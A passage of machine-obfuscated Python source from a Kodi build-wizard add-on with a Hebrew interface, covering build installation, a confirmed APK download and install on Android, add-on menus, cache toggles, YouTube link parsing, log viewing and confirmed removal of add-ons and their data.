            OOO00O0000OO00O0O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOOO0000O0O00 ,wiz .checkBuild (OOO0OOOO0000O0O00 ,'version'))#line:4182
            if KODI_VERSION <=18 :#line:4183
                DP .update (0 ,OOO00O0000OO00O0O ,'','אנא המתן...')#line:4184
            else :#line:4185
                DP .update (0 ,OOO00O0000OO00O0O +'\n'+''+'\n'+'אנא המתן...')#line:4186
            if DP .iscanceled ():#line:4187
             DP .close ()#line:4188
            O0O00O0OO0O0O0OO0 ,O0OO0O0O00O00O000 ,OOO0O0OOO00O00OOO =extract .all (O0OOO0O000OOOOO0O ,HOME ,DP ,title =OOO00O0000OO00O0O )#line:4189
            if int (float (O0O00O0OO0O0O0OO0 ))>0 :#line:4190
                fastupdatefirstbuild (NOTEID )#line:4192
                wiz .setS ('buildname',OOO0OOOO0000O0O00 )#line:4193
                wiz .setS ('buildversion',wiz .checkBuild (OOO0OOOO0000O0O00 ,'version'))#line:4194
                wiz .setS ('buildtheme','')#line:4195
                wiz .setS ('latestversion',wiz .checkBuild (OOO0OOOO0000O0O00 ,'version'))#line:4196
                wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4197
                wiz .setS ('installed','true')#line:4198
                skin_homeselect ()#line:4200
                del_addon_db ()#line:4201
                if KODI_VERSION <=18 :#line:4203
                  kodi17_18pack ()#line:4204
                if wiz .getS ("dragon")=='true':#line:4205
                  install_turkey ()#line:4206
                wiz .kodi17Fix ()#line:4208
                fix_gui ()#line:4210
                try :#line:4211
                    tdlib (force =True )#line:4212
                except :pass #line:4213
                O00000O00O000O00O =[]#line:4214
                if len (wiz .getS ("sync_user"))>0 :#line:4215
                    O00000O00O000O00O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מסנכרן את החשבון שלך[/COLOR]'%COLOR2 ))#line:4216
                    O00000O00O000O00O [0 ].start ()#line:4217
                    xbmc .sleep (3000 )#line:4218
                    from resources .libs import sync #line:4220
                fix_Dialog_Settings17 ()#line:4222
                try :os .remove (O0OOO0O000OOOOO0O )#line:4223
                except :pass #line:4224
                DP .close ()#line:4227
                backup_setting_file ()#line:4229
                O00000O00O000O00O =[]#line:4230
                O00000O00O000O00O .append (Thread (indicator ))#line:4231
                O00000O00O000O00O [0 ].start ()#line:4232
                O00000O00O000O00O =[]#line:4233
                O00000O00O000O00O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה הסתיימה.[/COLOR]'%COLOR2 ))#line:4234
                O00000O00O000O00O [0 ].start ()#line:4235
                resetkodi ()#line:4236
            else :#line:4237
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:4238
                O00000O00O000O00O =[]#line:4239
                O00000O00O000O00O .append (Thread (gomsb ))#line:4240
                O00000O00O000O00O [0 ].start ()#line:4241
                DP .close ()#line:4242
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה אינה זמינה כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 )#line:4243
                sys .exit ()#line:4244
def testTheme (O000000OO0OOO000O ):#line:4248
	O00OO0O0O0O0OOO0O =zipfile .ZipFile (O000000OO0OOO000O )#line:4249
	for OOOOOO0000000OOOO in O00OO0O0O0O0OOO0O .infolist ():#line:4250
		if '/settings.xml'in OOOOOO0000000OOOO .filename :#line:4251
			return True #line:4252
	return False #line:4253
def testGui (OO0OOO0000OOOOO0O ):#line:4255
	OO0O0O0O00O000O0O =zipfile .ZipFile (OO0OOO0000OOOOO0O )#line:4256
	for O00O00O000000O00O in OO0O0O0O00O000O0O .infolist ():#line:4257
		if '/guisettings.xml'in O00O00O000000O00O .filename :#line:4258
			return True #line:4259
	return False #line:4260
def apkInstaller (OOOOOOOO0O000OOO0 ,OO00O0O0OOOO0OO0O ):#line:4262
	wiz .log (OOOOOOOO0O000OOO0 )#line:4263
	wiz .log (OO00O0O0OOOO0OO0O )#line:4264
	if wiz .platform_d ()=='android':#line:4265
		OO0OOOO00OO0OOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOO0O000OOO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4266
		if not OO0OOOO00OO0OOOOO :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4267
		O00OOO000OOOO0O00 =OOOOOOOO0O000OOO0 #line:4268
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4269
		if not wiz .workingURL (OO00O0O0OOOO0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4270
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO000OOOO0O00 ),'','אנא המתן')#line:4271
		OOO0O00OO0OO0OO00 =os .path .join (PACKAGES ,"%s.apk"%OOOOOOOO0O000OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4272
		try :os .remove (OOO0O00OO0OO0OO00 )#line:4273
		except :pass #line:4274
		downloader .download (OO00O0O0OOOO0OO0O ,OOO0O00OO0OO0OO00 ,DP )#line:4275
		xbmc .sleep (100 )#line:4276
		DP .close ()#line:4277
		notify .apkInstaller (OOOOOOOO0O000OOO0 )#line:4278
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO0O00OO0OO0OO00 +'")')#line:4279
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4280
def createMenu (OOOO0O0000O0O00O0 ,O0O00000000OO0O0O ,O0OOOOOOO00000OO0 ):#line:4286
	if OOOO0O0000O0O00O0 =='saveaddon':#line:4287
		OO0OO0O00OOOOOO0O =[]#line:4288
		OO000OOO0OOO00OO0 =que (O0O00000000OO0O0O .lower ().replace (' ',''))#line:4289
		O00O00O0O0OO0OO00 =O0O00000000OO0O0O .replace ('Debrid','Real Debrid')#line:4290
		O0OO0O0000O0O0O0O =que (O0OOOOOOO00000OO0 .lower ().replace (' ',''))#line:4291
		O0OOOOOOO00000OO0 =O0OOOOOOO00000OO0 .replace ('url','URL Resolver')#line:4292
		OO0OO0O00OOOOOO0O .append ((THEME2 %O0OOOOOOO00000OO0 .title (),' '))#line:4293
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Save %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4294
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Restore %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4295
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Clear %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4296
	elif OOOO0O0000O0O00O0 =='save':#line:4297
		OO0OO0O00OOOOOO0O =[]#line:4298
		OO000OOO0OOO00OO0 =que (O0O00000000OO0O0O .lower ().replace (' ',''))#line:4299
		O00O00O0O0OO0OO00 =O0O00000000OO0O0O .replace ('Debrid','Real Debrid')#line:4300
		O0OO0O0000O0O0O0O =que (O0OOOOOOO00000OO0 .lower ().replace (' ',''))#line:4301
		O0OOOOOOO00000OO0 =O0OOOOOOO00000OO0 .replace ('url','URL Resolver')#line:4302
		OO0OO0O00OOOOOO0O .append ((THEME2 %O0OOOOOOO00000OO0 .title (),' '))#line:4303
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Register %s'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4304
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Save %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4305
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Restore %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4306
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Import %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4307
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Clear Addon %s Data'%O00O00O0O0OO0OO00 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO000OOO0OOO00OO0 ,O0OO0O0000O0O0O0O )))#line:4308
	elif OOOO0O0000O0O00O0 =='install':#line:4309
		OO0OO0O00OOOOOO0O =[]#line:4310
		O0OO0O0000O0O0O0O =que (O0OOOOOOO00000OO0 )#line:4311
		OO0OO0O00OOOOOO0O .append ((THEME2 %O0OOOOOOO00000OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OO0O0000O0O0O0O )))#line:4312
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OO0O0000O0O0O0O )))#line:4313
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OO0O0000O0O0O0O )))#line:4314
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OO0O0000O0O0O0O )))#line:4315
		OO0OO0O00OOOOOO0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OO0O0000O0O0O0O )))#line:4316
	OO0OO0O00OOOOOO0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4317
	return OO0OO0O00OOOOOO0O #line:4318
def toggleCache (OOO0O0O0O0O000O00 ):#line:4320
	O0O00O0000000O00O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4321
	O00OOO0OO0O00O0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4322
	if OOO0O0O0O0O000O00 in ['true','false']:#line:4323
		for O000OOO000OO0OOOO in O0O00O0000000O00O :#line:4324
			wiz .setS (O000OOO000OO0OOOO ,OOO0O0O0O0O000O00 )#line:4325
	else :#line:4326
		if not OOO0O0O0O0O000O00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4327
			try :#line:4328
				O000OOO000OO0OOOO =O00OOO0OO0O00O0OO [O0O00O0000000O00O .index (OOO0O0O0O0O000O00 )]#line:4329
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O000OOO000OO0OOOO ))#line:4330
			except :#line:4331
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0O0O0O0O000O00 ))#line:4332
		else :#line:4333
			O0000OO0O000OOO00 ='true'if wiz .getS (OOO0O0O0O0O000O00 )=='false'else 'false'#line:4334
			wiz .setS (OOO0O0O0O0O000O00 ,O0000OO0O000OOO00 )#line:4335
def playVideo (O00O0000000O00OO0 ):#line:4337
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00O0000000O00OO0 )#line:4338
	if 'watch?v='in O00O0000000O00OO0 :#line:4339
		OOOO000OO0OO00OO0 ,O0O00OO0000OO00OO =O00O0000000O00OO0 .split ('?')#line:4340
		OOOO0OO0O00O000O0 =O0O00OO0000OO00OO .split ('&')#line:4341
		for OO0OO0OO0000O00OO in OOOO0OO0O00O000O0 :#line:4342
			if OO0OO0OO0000O00OO .startswith ('v='):#line:4343
				O00O0000000O00OO0 =OO0OO0OO0000O00OO [2 :]#line:4344
				break #line:4345
			else :continue #line:4346
	elif 'embed'in O00O0000000O00OO0 or 'youtu.be'in O00O0000000O00OO0 :#line:4347
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00O0000000O00OO0 )#line:4348
		OOOO000OO0OO00OO0 =O00O0000000O00OO0 .split ('/')#line:4349
		if len (OOOO000OO0OO00OO0 [-1 ])>5 :#line:4350
			O00O0000000O00OO0 =OOOO000OO0OO00OO0 [-1 ]#line:4351
		elif len (OOOO000OO0OO00OO0 [-2 ])>5 :#line:4352
			O00O0000000O00OO0 =OOOO000OO0OO00OO0 [-2 ]#line:4353
	wiz .log ("YouTube URL: %s"%O00O0000000O00OO0 )#line:4354
	yt .PlayVideo (O00O0000000O00OO0 )#line:4355
def viewLogFile ():#line:4357
	OO0O00O0O00O0O000 =wiz .Grab_Log (True )#line:4358
	O00O0O0O00O00O00O =wiz .Grab_Log (True ,True )#line:4359
	OOOOO0OOOO0000000 =0 ;OO0000O0O00OOO0OO =OO0O00O0O00O0O000 #line:4360
	if not O00O0O0O00O00O00O ==False and not OO0O00O0O00O0O000 ==False :#line:4361
		OOOOO0OOOO0000000 =DIALOG .select (ADDONTITLE ,["View %s"%OO0O00O0O00O0O000 .replace (LOG ,""),"View %s"%O00O0O0O00O00O00O .replace (LOG ,"")])#line:4362
		if OOOOO0OOOO0000000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4363
	elif OO0O00O0O00O0O000 ==False and O00O0O0O00O00O00O ==False :#line:4364
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4365
		return #line:4366
	elif not OO0O00O0O00O0O000 ==False :OOOOO0OOOO0000000 =0 #line:4367
	elif not O00O0O0O00O00O00O ==False :OOOOO0OOOO0000000 =1 #line:4368
	OO0000O0O00OOO0OO =OO0O00O0O00O0O000 if OOOOO0OOOO0000000 ==0 else O00O0O0O00O00O00O #line:4370
	OO0O0O0O0O0OO0O0O =wiz .Grab_Log (False )if OOOOO0OOOO0000000 ==0 else wiz .Grab_Log (False ,True )#line:4371
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0000O0O00OOO0OO ),OO0O0O0O0O0OO0O0O )#line:4373
def errorChecking (log =None ,count =None ,all =None ):#line:4375
	if log ==None :#line:4376
		O0O00O0O00OO0000O =wiz .Grab_Log (True )#line:4377
		O0O000O0000OO00O0 =wiz .Grab_Log (True ,True )#line:4378
		if not O0O000O0000OO00O0 ==False and not O0O00O0O00OO0000O ==False :#line:4379
			O00OOOO000OOOO0OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O00O0O00OO0000O .replace (LOG ,""),errorChecking (O0O00O0O00OO0000O ,True ,True )),"View %s: %s error(s)"%(O0O000O0000OO00O0 .replace (LOG ,""),errorChecking (O0O000O0000OO00O0 ,True ,True ))])#line:4380
			if O00OOOO000OOOO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4381
		elif O0O00O0O00OO0000O ==False and O0O000O0000OO00O0 ==False :#line:4382
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4383
			return #line:4384
		elif not O0O00O0O00OO0000O ==False :O00OOOO000OOOO0OO =0 #line:4385
		elif not O0O000O0000OO00O0 ==False :O00OOOO000OOOO0OO =1 #line:4386
		log =O0O00O0O00OO0000O if O00OOOO000OOOO0OO ==0 else O0O000O0000OO00O0 #line:4387
	if log ==False :#line:4388
		if count ==None :#line:4389
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4390
			return False #line:4391
		else :#line:4392
			return 0 #line:4393
	else :#line:4394
		if os .path .exists (log ):#line:4395
			O000OOO0OO0O0O000 =open (log ,mode ='r');OO00O0O0000O0OO0O =O000OOO0OO0O0O000 .read ().replace ('\n','').replace ('\r','');O000OOO0OO0O0O000 .close ()#line:4396
			O0000O000O0O0OOO0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO00O0O0000O0OO0O )#line:4397
			if not count ==None :#line:4398
				if all ==None :#line:4399
					OOOOOOOO0O000O00O =0 #line:4400
					for O0OOO000O0OOO0O00 in O0000O000O0O0OOO0 :#line:4401
						if ADDON_ID in O0OOO000O0OOO0O00 :OOOOOOOO0O000O00O +=1 #line:4402
					return OOOOOOOO0O000O00O #line:4403
				else :return len (O0000O000O0O0OOO0 )#line:4404
			if len (O0000O000O0O0OOO0 )>0 :#line:4405
				OOOOOOOO0O000O00O =0 ;OO0OOO000OOO00OOO =""#line:4406
				for O0OOO000O0OOO0O00 in O0000O000O0O0OOO0 :#line:4407
					if all ==None and not ADDON_ID in O0OOO000O0OOO0O00 :continue #line:4408
					else :#line:4409
						OOOOOOOO0O000O00O +=1 #line:4410
						OO0OOO000OOO00OOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOOOOOO0O000O00O ,O0OOO000O0OOO0O00 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4411
				if OOOOOOOO0O000O00O >0 :#line:4412
					wiz .TextBox (ADDONTITLE ,OO0OOO000OOO00OOO )#line:4413
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4414
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4415
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4416
ACTION_PREVIOUS_MENU =10 #line:4418
ACTION_NAV_BACK =92 #line:4419
ACTION_MOVE_LEFT =1 #line:4420
ACTION_MOVE_RIGHT =2 #line:4421
ACTION_MOVE_UP =3 #line:4422
ACTION_MOVE_DOWN =4 #line:4423
ACTION_MOUSE_WHEEL_UP =104 #line:4424
ACTION_MOUSE_WHEEL_DOWN =105 #line:4425
ACTION_MOVE_MOUSE =107 #line:4426
ACTION_SELECT_ITEM =7 #line:4427
ACTION_BACKSPACE =110 #line:4428
ACTION_MOUSE_LEFT_CLICK =100 #line:4429
ACTION_MOUSE_LONG_CLICK =108 #line:4430
def LogViewer (default =None ):#line:4432
	class OO0O000OO000O00OO (xbmcgui .WindowXMLDialog ):#line:4433
		def __init__ (OO0O00OO000OO0OO0 ,*OO0OO0OOOO00O0O0O ,**OO0OO0O00OO0OOO0O ):#line:4434
			OO0O00OO000OO0OO0 .default =OO0OO0O00OO0OOO0O ['default']#line:4435
		def onInit (OO0OO0OOO00OOOO0O ):#line:4437
			OO0OO0OOO00OOOO0O .title =101 #line:4438
			OO0OO0OOO00OOOO0O .msg =102 #line:4439
			OO0OO0OOO00OOOO0O .scrollbar =103 #line:4440
			OO0OO0OOO00OOOO0O .upload =201 #line:4441
			OO0OO0OOO00OOOO0O .kodi =202 #line:4442
			OO0OO0OOO00OOOO0O .kodiold =203 #line:4443
			OO0OO0OOO00OOOO0O .wizard =204 #line:4444
			OO0OO0OOO00OOOO0O .okbutton =205 #line:4445
			OO000OOO00O00OO00 =open (OO0OO0OOO00OOOO0O .default ,'r')#line:4446
			OO0OO0OOO00OOOO0O .logmsg =OO000OOO00O00OO00 .read ()#line:4447
			OO000OOO00O00OO00 .close ()#line:4448
			OO0OO0OOO00OOOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO0OOO00OOOO0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4449
			OO0OO0OOO00OOOO0O .showdialog ()#line:4450
		def showdialog (O0O00OO00O0O0O0OO ):#line:4452
			O0O00OO00O0O0O0OO .getControl (O0O00OO00O0O0O0OO .title ).setLabel (O0O00OO00O0O0O0OO .titlemsg )#line:4453
			O0O00OO00O0O0O0OO .getControl (O0O00OO00O0O0O0OO .msg ).setText (wiz .highlightText (O0O00OO00O0O0O0OO .logmsg ))#line:4454
			O0O00OO00O0O0O0OO .setFocusId (O0O00OO00O0O0O0OO .scrollbar )#line:4455
		def onClick (OO00000OO0OO0O00O ,O0OOO0O00O00O0O0O ):#line:4457
			if O0OOO0O00O00O0O0O ==OO00000OO0OO0O00O .okbutton :OO00000OO0OO0O00O .close ()#line:4458
			elif O0OOO0O00O00O0O0O ==OO00000OO0OO0O00O .upload :OO00000OO0OO0O00O .close ();uploadLog .Main ()#line:4459
			elif O0OOO0O00O00O0O0O ==OO00000OO0OO0O00O .kodi :#line:4460
				O0OOOOOO0O0O0O0O0 =wiz .Grab_Log (False )#line:4461
				O00O0O0000000O00O =wiz .Grab_Log (True )#line:4462
				if O0OOOOOO0O0O0O0O0 ==False :#line:4463
					OO00000OO0OO0O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4464
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText ("Log File Does Not Exists!")#line:4465
				else :#line:4466
					OO00000OO0OO0O00O .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000000O00O .replace (LOG ,''))#line:4467
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .title ).setLabel (OO00000OO0OO0O00O .titlemsg )#line:4468
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText (wiz .highlightText (O0OOOOOO0O0O0O0O0 ))#line:4469
					OO00000OO0OO0O00O .setFocusId (OO00000OO0OO0O00O .scrollbar )#line:4470
			elif O0OOO0O00O00O0O0O ==OO00000OO0OO0O00O .kodiold :#line:4471
				O0OOOOOO0O0O0O0O0 =wiz .Grab_Log (False ,True )#line:4472
				O00O0O0000000O00O =wiz .Grab_Log (True ,True )#line:4473
				if O0OOOOOO0O0O0O0O0 ==False :#line:4474
					OO00000OO0OO0O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4475
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText ("Log File Does Not Exists!")#line:4476
				else :#line:4477
					OO00000OO0OO0O00O .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000000O00O .replace (LOG ,''))#line:4478
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .title ).setLabel (OO00000OO0OO0O00O .titlemsg )#line:4479
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText (wiz .highlightText (O0OOOOOO0O0O0O0O0 ))#line:4480
					OO00000OO0OO0O00O .setFocusId (OO00000OO0OO0O00O .scrollbar )#line:4481
			elif O0OOO0O00O00O0O0O ==OO00000OO0OO0O00O .wizard :#line:4482
				O0OOOOOO0O0O0O0O0 =wiz .Grab_Log (False ,False ,True )#line:4483
				O00O0O0000000O00O =wiz .Grab_Log (True ,False ,True )#line:4484
				if O0OOOOOO0O0O0O0O0 ==False :#line:4485
					OO00000OO0OO0O00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4486
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText ("Log File Does Not Exists!")#line:4487
				else :#line:4488
					OO00000OO0OO0O00O .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0O0000000O00O .replace (ADDONDATA ,''))#line:4489
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .title ).setLabel (OO00000OO0OO0O00O .titlemsg )#line:4490
					OO00000OO0OO0O00O .getControl (OO00000OO0OO0O00O .msg ).setText (wiz .highlightText (O0OOOOOO0O0O0O0O0 ))#line:4491
					OO00000OO0OO0O00O .setFocusId (OO00000OO0OO0O00O .scrollbar )#line:4492
		def onAction (O0O0O000OOO000O00 ,OOO00OOOOOOOO0O0O ):#line:4494
			if OOO00OOOOOOOO0O0O ==ACTION_PREVIOUS_MENU :O0O0O000OOO000O00 .close ()#line:4495
			elif OOO00OOOOOOOO0O0O ==ACTION_NAV_BACK :O0O0O000OOO000O00 .close ()#line:4496
	if default ==None :default =wiz .Grab_Log (True )#line:4497
	OOOO0OO0000OOO000 =OO0O000OO000O00OO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4498
	OOOO0OO0000OOO000 .doModal ()#line:4499
	del OOOO0OO0000OOO000 #line:4500
def removeAddon (O0OOO0OO000OOO000 ,O00OO0OOO00O00000 ,over =False ):#line:4502
	if not over ==False :#line:4503
		O000OOOO000000OOO =1 #line:4504
	else :#line:4505
		O000OOOO000000OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO0OOO00O00000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OOO0OO000OOO000 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4506
	if O000OOOO000000OOO ==1 :#line:4507
		OOO0O0OOOO0O000OO =os .path .join (ADDONS ,O0OOO0OO000OOO000 )#line:4508
		wiz .log ("Removing Addon %s"%O0OOO0OO000OOO000 )#line:4509
		wiz .cleanHouse (OOO0O0OOOO0O000OO )#line:4510
		xbmc .sleep (1000 )#line:4511
		try :shutil .rmtree (OOO0O0OOOO0O000OO )#line:4512
		except Exception as O0OOO0O00O0O0OO0O :wiz .log ("Error removing %s"%O0OOO0OO000OOO000 ,5 )#line:4513
		removeAddonData (O0OOO0OO000OOO000 ,O00OO0OOO00O00000 ,over )#line:4514
	if over ==False :#line:4515
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00OO0OOO00O00000 ))#line:4516
def removeAddonData (OO000000OO0OOO000 ,name =None ,over =False ):#line:4518
	if OO000000OO0OOO000 =='all':#line:4519
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4520
			wiz .cleanHouse (ADDOND )#line:4521
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4522
	elif OO000000OO0OOO000 =='uninstalled':#line:4523
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4524
			O00O0O0OO00O0OOO0 =0 #line:4525
			for OO00O0000O00000OO in glob .glob (os .path .join (ADDOND ,'*')):#line:4526
				OOO0OO0OO00OOOO00 =OO00O0000O00000OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4527
				if OOO0OO0OO00OOOO00 in EXCLUDES :pass #line:4528
				elif os .path .exists (os .path .join (ADDONS ,OOO0OO0OO00OOOO00 )):pass #line:4529
				else :wiz .cleanHouse (OO00O0000O00000OO );O00O0O0OO00O0OOO0 +=1 ;wiz .log (OO00O0000O00000OO );shutil .rmtree (OO00O0000O00000OO )#line:4530
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00O0O0OO00O0OOO0 ))#line:4531
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4532
	elif OO000000OO0OOO000 =='empty':#line:4533
